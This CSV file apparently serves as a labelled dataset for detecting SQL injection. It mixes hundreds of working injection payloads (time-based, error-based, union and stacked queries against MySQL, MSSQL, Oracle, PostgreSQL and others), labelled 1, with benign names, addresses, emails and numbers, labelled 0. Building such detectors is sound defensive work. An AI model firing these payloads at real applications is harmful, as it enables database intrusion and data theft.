Query,Label
"1"") and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (""rrbl""=""rrbl",1
raudres,0
2o0eri23,0
31096,0
"-9615) as dntk where 4780=4780 union all select 4780,4780,4780,4780,4780,4780,4780,4780#",1
reddick,0
89c3via,0
"1"")) and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ((""auyv""=""auyv",1
89590939m,0
roelos de sayago,0
5h5c8,0
quitral blasi,0
1) where 2734=2734 waitfor delay '0:0:5'--,1
jamaal,0
"1'+(select qymy where 8657=8657 and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
stadlen@asociaciondearquitectoslatinoamericanos.tc,0
21184515c,0
9661992110368091,0
"1%"") and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (""%""=""",1
1 where 5080=5080;select (case when (5698=3453) then 5698 else 1/(select 0) end)--,1
"1"") as oztl where 6655=6655 or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1
villanueva de algaidas,0
he82,0
"-1269' or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and 'gohv' like 'gohv",1
"1)) as huxq where 7451=7451 union all select null,null,null--",1
"calle aluders, 96",0
"1%' or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",1
"calle reina violante, 35,",0
castilla s/n,0
43736,0
mallat paiva,0
duo_davalos@designworld.cz,0
"1"";(select * from (select(sleep(5)))srmq) and ""wsmz"" like ""wsmz",1
grueneic,0
-4803%')) or 8571=8571--,1
malditamente,0
"c/ madrid, 53 5-f",0
2969,0
"1%"" union all select null,null,null,null,null,null,null,null,null#",1
1'||(select 'ifts' from dual where 6329=6329;begin dbms_lock.sleep(5); end--,1
rhett,0
46266,0
"1'))) or elt(6272=6272,sleep(5)) and ((('pded'='pded",1
1')) as xpmy where 5274=5274 rlike (select (case when (6252=7704) then 1 else 0x28 end))--,1
"1%')));select like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((('%'='",1
espineta astorquiza,0
2174818451824569,0
1'+(select yjyp where 9696=9696;select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,1
sant jaume dels domenys,0
"primavera, 174",0
regenta,0
contrariosa,0
"1"")) union all select null,null--",1
"1' or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and 'adsh'='adsh",1
kalila,0
"-7194'||(select 'gbrx' from dual where 6205=6205 union all select 6205,6205,6205,6205,6205,6205,6205#",1
05659,0
korbel,0
"1"";select benchmark(5000000,md5(0x4c4d6142)) and ""azzv"" like ""azzv",1
"juan vazquez, 112,",0
borio-radichev@lingote.com.gr,0
40139732v,0
salva carol,0
ciara,0
"1)) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((5200=5200",1
"-9178 where 2253=2253 union all select 2253,2253,2253,2253,2253,2253,2253,2253#",1
denver,0
"c/ padre ignacio ellaguria, 117 6-e",0
1'+(select onzd where 8452=8452 and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric))+',1
greaves3,0
0570146007146945,0
"estao, 92 4?c",0
-2912')) order by 1--,1
otvar,0
"1)) as kycl where 8008=8008 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))--",1
1635,0
"-6659') where 1256=1256 union all select 1256,1256--",1
maraa,0
pujals ogando,0
1370,0
desnuda,0
"1"")));waitfor delay '0:0:5' and (((""mfro"" like ""mfro",1
"calle alpens 41, 2?g",0
37427,0
"-1302"")) as rshr where 2800=2800 or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",1
novisedl9,0
"-3347%"" or 9323=9323#",1
evacuacin,0
"1""))) and 4595=4595#",1
coallier,0
erich,0
08363269d,0
"1) where 4710=4710 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)--",1
"1"" or (select * from (select(sleep(5)))ydpu) and ""uvoq"" like ""uvoq",1
1%')) rlike (select * from (select(sleep(5)))vwyq)#,1
-5555)) as ldte where 4583=4583 order by 1#,1
delvalle llers,0
mae,0
catatipia,0
"c/ cristu benditu, 112, 12?g",0
43232451h,0
dellinge,0
calle colegio mayor goimendi 72 4?d,0
"1) where 4711=4711;select count(*) from generate_series(1,5000000)--",1
darelle,0
lilias,0
"lapa, la",0
boom@paseotuperro.mo,0
c/ virgen del pilar 144,0
34340,0
"1"") as upjw where 3880=3880 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1
68889499z,0
ges,0
quintanilla de urz,0
ostyn.martan@icodea.lu,0
3j,0
5805206307747545,0
ku,0
93234482a,0
tetona,0
"-7138"" union all select 2341,2341,2341,2341--",1
zahira,0
wessell.georg@smalltec.md,0
"calle albia de castro, s/n",0
"c/ capella, 141, 4?g",0
"calle doctor fleming, 7, 7-d",0
introduccin,0
"1"")) as ltco where 3862=3862 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1
bevis,0
"1'))) and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and ((('cfhi' like 'cfhi",1
812,0
02838,0
"c/ geranio, 65",0
glazar@x2.com.net,0
1%')));select (case when (9746=8055) then 9746 else 1/(select 0) end)--,1
lacero,0
rub,0
"1%')(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and ('%'='",1
13348536a,0
"1) and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",1
2190197985147035,0
gidget,0
05200,0
"calle calderon de la barca, 141",0
50297,0
"1) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)",1
e6749l178e3a,0
3479188393486250,0
"1%' and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",1
"1%' union all select null,null,null,null#",1
"1"") where 1144=1144 and 2006=2006",1
shalne,0
abaeto sanchon,0
"calle astro s/n,",0
85089975a,0
"1"" where 9919=9919;select benchmark(5000000,md5(0x714e4153))#",1
7548043709154269,0
teosa,0
co8descender,0
7896,0
1') as cdrm where 4595=4595 order by 1#,1
"guzman de alfarache, 18,",0
6742076773015534,0
8641,0
salgueiro 188,0
57970346l,0
juglandea,0
"1'+(select dyfw where 7743=7743 and 8407=(select count(*) from generate_series(1,5000000)))+'",1
"-1598"")) or elt(5329=9628,9628) and ((""hyxq"" like ""hyxq",1
"1 where 2267=2267 and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5)--",1
"-2378"" where 2686=2686 or 6872=6872--",1
15618,0
pinnow.mcmillan3@hipernavarra.mm,0
"1) as rsyw where 4857=4857 or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--",1
"1') as jiic where 6158=6158 or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--",1
triantap,0
soslaya,0
eccles@aspirantes.gh,0
elantxobe,0
repelo,0
ulpiano,0
"-8144') where 1691=1691 or elt(7246=7816,7816)--",1
"1"")) or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and ((""oxvw""=""oxvw",1
39152269j,0
19127,0
-4562') or 3038=3038,1
"-5115"" union all select 1642,1642,1642,1642,1642,1642,1642,1642--",1
9274,0
"cabaeros, 131",0
duchement tenza,0
leobaldo,0
1') where 4003=4003;select sleep(5)#,1
burbidge@elalamorestaurante.pr,0
glorieta ramiro ii 61,0
sant lloren de la muga,0
"1)) and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ((5776=5776",1
5e56ir2,0
alentorn etayo,0
"1"") as rqpp where 9383=9383 or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1
gareth,0
"1%' union all select null,null,null,null,null,null,null,null,null,null--",1
9766800722499068,0
rigas.albalak@albeiteria.it,0
"1'))) or 8514=benchmark(5000000,md5(0x544d5a4c))#",1
emberrincharse,0
"1%')) union all select null,null#",1
2187090627457981,0
"1 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)",1
salazar borja,0
"1'))) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((('rfln'='rfln",1
pech+e,0
c4ap0765do,0
"calle teresa pamies i bertran 21,",0
1' or 4240=(select 4240 from pg_sleep(5))--,1
danilo,0
1')) rlike (select * from (select(sleep(5)))vwyq)#,1
1' and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and 'omlt'='omlt,1
38821598j,0
moreno undurraga,0
polesello@tantomontamontatanto.int,0
c/ masca 45,0
"-7418 union all select 1340,1340,1340,1340,1340#",1
"1')) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (('aumk' like 'aumk",1
05580,0
calle minerva 66 12?c,0
"plaza benidorm 155, 5?e",0
"1"") and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (""ilrk""=""ilrk",1
passatge arago 107,0
villamuriel de cerrato,0
"1 union all select null,null,null,null,null,null,null,null--",1
shukuri@velaconsultores.nl,0
-3881))) union all select 4438--,1
s9st6o,0
"-1755%' union all select 2615,2615,2615,2615,2615,2615#",1
pleskot@multasdetransito.mu,0
63482988k,0
haim.gorvin@didacramirez.tl,0
"1%"")));select sleep(5)#",1
antnimo,0
dalfolo bauls,0
nandor,0
5128322398230292,0
1ed6at0zacin,0
r54o60a,0
05248300e,0
"1"") union all select null,null,null,null,null--",1
dalleto poroma,0
parola@zonamodelos.pl,0
"1' and 3824=benchmark(5000000,md5(0x76555642)) and 'pbin'='pbin",1
to2adora,0
"-4596"" union all select 5761#",1
"calle arc de sant marti, 56",0
1875,0
"1"" union all select null,null,null,null--",1
919,0
"blasco de garay, 168,",0
kiri,0
"-1372%'))) union all select 8403,8403,8403,8403#",1
"losilla, la",0
1'+(select 'sfko' where 6853=6853 rlike sleep(5)#,1
cancela arce,0
jabbari,0
quilley0@frenchpolynesia.com.st,0
"riba, la",0
1' where 3900=3900 and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--,1
goi,0
"1))) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (((8738=8738",1
"1"")));(select * from (select(sleep(5)))srmq) and (((""sxih""=""sxih",1
sendrs tudanca,0
5856365245432307,0
34708532z,0
"1'))) or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and ((('toft'='toft",1
korey_molina@juguetespersonales.gob,0
8995996565558024,0
banaei,0
"1%') and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",1
1%');waitfor delay '0:0:5' and ('%'=',1
84881293t,0
85673796s,0
"1')) as xntz where 5801=5801 or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x)--",1
"-3436) or elt(1032=1032,3623)",1
"1' and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and 'dubu' like 'dubu",1
7559,0
"1'||(select 'epjf' from dual where 8584=8584 and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1
8352,0
reconfortante,0
1') and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ('hgwt' like 'hgwt,1
1);begin user_lock.sleep(5); end and (4610=4610,1
"1' and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)",1
"1) as hlit where 4973=4973 procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",1
"llosa de ranes, la",0
-9434') union all select 3106#,1
tuneu,0
aghili,0
tella-sin,0
18505219v,0
figuerola,0
beomsahn,0
4823192107223935,0
1') where 5540=5540 waitfor delay '0:0:5'--,1
7159056780538837,0
"1%"" or sleep(5)#",1
intima,0
"1 where 1656=1656 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1
6019,0
folsom_talli@esteticadayda.tel,0
1%'))) and (select * from (select(sleep(5)))gcrr)#,1
1)));select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--,1
1976,0
-6081 where 3681=3681 or 2603=3138--,1
ekezian-wohlfeiler@cirugiaalbeiteria.lv,0
papanduja,0
1' in boolean mode) and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)#,1
"1%""));select case when 5308=6745 then 1 else null end--",1
chin-lin,0
"1') as myxr where 6299=6299 and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
89740217j,0
ann-margaret@indorec.pro,0
mylong@deltamarina.aq,0
"1%"";select count(*) from generate_series(1,5000000) and ""%""=""",1
hanhua,0
elbeze,0
11954779t,0
6onc+hesta,0
macedonio,0
27,0
desligar,0
margarit,0
sant lloren des cardassar,0
00090113e,0
garvn,0
besnehard8@itrends.tn,0
"1"" where 9342=9342 and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq')--",1
"c/ ramos carrion, s/n 2?h",0
calabazas de fuentiduea,0
91800426c,0
1 where 9393=9393 waitfor delay '0:0:5'--,1
3243,0
khanvali,0
dorsay@ustream.cc,0
ardie9temente,0
alek,0
"1) union all select null,null,null,null,null--",1
"1%"")) and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1
"1"")) as sqzh where 5672=5672 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1
zanquita,0
1' and (5116=1602)*1602,1
"calle la merce, 120",0
"virgen del mayor dolor 188, 11?a",0
01067171v,0
61128609z,0
3892784649587009,0
25152,0
"1"") and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (""cmhh"" like ""cmhh",1
sanromn casuso,0
"1"")));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",1
24n1e39,0
"1) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (3814=3814",1
cracoviano,0
"1'))) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ((('phdn' like 'phdn",1
98011650w,0
calle caro 10 10?e,0
georges,0
buleje quesada,0
"travesia brieva, 171,",0
09540,0
09620,0
princep muntadas,0
"1%"";waitfor delay '0:0:5'--",1
"1)) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ((5888=5888",1
"-4205' union all select 8986,8986,8986,8986,8986,8986,8986,8986,8986,8986#",1
"-7345%"" or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ""%""=""",1
liedtke_truhitte@ac-activos.gob,0
"1%"")));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",1
marko,0
montroy,0
nonaspe,0
"c/ granate 13, 12h",0
4210,0
49,0
"calle pinos los 128,",0
t45o0a35,0
"1') or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ('lmoh' like 'lmoh",1
"1,(select (case when (3743=9640) then 1 else 3743*(select 3743 from master..sysdatabases) end))",1
"1"" where 6023=6023;if(1928=4811) select 1928 else drop function ucko--",1
-3450' where 4478=4478 or 9323=9323#,1
"calle san isidro labrador 188, 13?h",0
-8453))) or 3038=3038,1
klee8@farma-job.fj,0
21710,0
"calle tremp, 196 11?g",0
"calle belen 10, 8a",0
couri-manahan@copiar.com.fm,0
lidia,0
5956391095896498,0
"1""));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ((""soyg""=""soyg",1
5277668025491077,0
o'kinghtons camarena,0
guisset melo,0
capella,0
27c01a,0
1')) as vnwn where 8774=8774 and (select * from (select(sleep(5)))gcrr)#,1
"-1084') union all select 2634,2634,2634,2634,2634,2634,2634,2634#",1
02246,0
"partida lliriet d'en mig, 135, 10?a",0
"1') where 7640=7640 and make_set(8978=8594,8594)--",1
"1' where 4185=4185 procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)--",1
bourget,0
arrindell@salsaspain.so,0
berky,0
p1n0350a,0
"1 or 8156=(select count(*) from generate_series(1,5000000))--",1
"1"") where 7919=7919 and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
"c/ hermanos senise colmenero, 153, 3-d",0
nhat,0
revelante,0
"1""))(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and ((""uwdz""=""uwdz",1
37500,0
"-4543"") or 3038=3038",1
"1%'))) union all select null,null,null,null,null,null,null,null,null,null#",1
-7600' or 7684=3181#,1
pangborne@europop.mw,0
"-2583"") where 3455=3455 or make_set(9354=9354,7185)--",1
3755385437912895,0
82839528z,0
6el24a,0
p$ipo,0
pon38ra1l9,0
"1'||(select 'glec' from dual where 4846=4846;call regexp_substring(repeat(right(char(2385),0),500000000),null)--",1
"1%' and elt(1210=1210,sleep(5)) and '%'='",1
dinges,0
ikebe.king@zarasalud.us,0
8n66ies4a,0
17470,0
sprandel,0
1') as lgex where 4068=4068 and 1378=9247--,1
"aldea, l'",0
villabez,0
guciz,0
"1') or elt(6272=6272,sleep(5)) and ('xwsb'='xwsb",1
6538,0
1'+(select 'gprq' where 8928=8928;waitfor delay '0:0:5'--,1
"1"")) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((""yrgy"" like ""yrgy",1
72ic5oid4,0
ninnette,0
"1"") or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (""mejy""=""mejy",1
"1%"") and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and (""%""=""",1
26135,0
eclar@magadan.org.edu,0
42127,0
19,0
"1'+(select 'swxi' where 7651=7651 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4))+'",1
26124,0
jodie,0
mullin@gopersonaltrainers.nr,0
philippa,0
"1%"")) rlike (select (case when (4207=1757) then 1 else 0x28 end)) and ((""%""=""",1
geeta,0
1714562160313645,0
santa cruz del comercio,0
matar,0
49190,0
"1"" where 7015=7015;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",1
baguda sabarich,0
oroz-betelu,0
"1))) and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (((2997=2997",1
"1'))) and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((('abcf' like 'abcf",1
lantarn,0
jovn,0
hilton,0
9129,0
"-3794') union all select 2485,2485,2485,2485,2485--",1
arpad4@emepleo.lr,0
marlet esparraguera,0
70289546m,0
ace673,0
02345,0
zas,0
"1) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (4557=4557",1
01719,0
lacalle jambrina,0
5359941637472612,0
anys@ebuy.com.tr,0
"-2216"") where 6692=6692 union all select 6692,6692,6692#",1
17707,0
induracin,0
d1si0u544a,0
"1) where 2720=2720 and elt(4249=4249,7259)--",1
plazuela de la fuente cantero 124,0
poca urzagaste,0
"-8238')) union all select 9797,9797,9797,9797,9797,9797,9797,9797#",1
playado,0
07460,0
22860,0
lemoine5@informatica2009.zr,0
19846981m,0
44310,0
"1"" where 7279=7279 or 8514=benchmark(5000000,md5(0x544d5a4c))#",1
esmil42291,0
5abiana,0
1'||(select 'scct' where 2587=2587 and (select * from (select(sleep(5)))fzno))||',1
proftica,0
"1'||(select 'ymre' where 8681=8681;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",1
"1'+(select papc where 8900=8900 and elt(3114=3114,sleep(5))#",1
-7779') where 4976=4976 or 6872=6872--,1
"1"");select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",1
zulaima,0
"1'+(select lhho where 7579=7579 and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",1
"1%"")) rlike (select * from (select(sleep(5)))sgvo) and ((""%""=""",1
1em5le28r,0
"1"") as xaye where 5343=5343 and 4355=7475#",1
"1,(select (case when (8640=8640) then (ascii(regexp_substring(repeat(right(char(8640),0),500000000),null))) else 8640/(select 0 from information_schema.system_users) end) from information_schema.system_users)--",1
rosi10,0
"1%"")) and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ((""%""=""",1
39500,0
minas de riotinto,0
78717162f,0
1350447535832439,0
"1) and 8407=(select count(*) from generate_series(1,5000000)) and (2160=2160",1
"avda. pio xii, 48",0
"c/ja arco 125,",0
"pl. espaa, 108, 13?a",0
bl!teo,0
1%'))) and 7533=7533 and ((('%'=',1
"1%"")) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ((""%""=""",1
